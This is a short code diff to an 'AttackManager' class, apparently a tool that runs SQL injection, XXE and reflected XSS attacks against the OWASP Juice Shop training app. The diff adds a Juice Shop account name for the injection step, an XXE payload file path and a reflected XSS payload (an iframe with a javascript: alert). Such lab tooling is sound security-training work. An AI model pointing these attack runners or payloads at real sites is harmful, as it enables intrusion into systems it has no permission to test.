@@ -222,7 +222,7 @@ class AttackManager:
         if callback:
             callback("Starting sql injection...")
         username_input = "mc.safesearch@juice-sh.op"
-        simulate_sql_injection(url, username_input)
+        simulate_sql_injection(url, username_input, callback)
 
     def _run_xxe_data(self, url: str, use_proxy: bool = True, callback: Callable = None):
         """
@@ -230,7 +230,8 @@ class AttackManager:
         """
         if callback:
             callback("Starting XXE Data Access...")
-        exploit_xxe(url)
+        payload_file = "Attacks/XXE_payload.xml"
+        exploit_xxe(url, payload_file, callback)
 
     def _run_xss(self, url: str, use_proxy: bool = True, callback: Callable = None):
         """
@@ -238,4 +239,5 @@ class AttackManager:
         """
         if callback:
             callback("Starting Reflected XSS...")
-        simulate_reflected_xss(url)
+        malicious_script = "<iframe src='javascript:alert(`XSS6`)'></iframe>"
+        simulate_reflected_xss(url, malicious_script, callback)
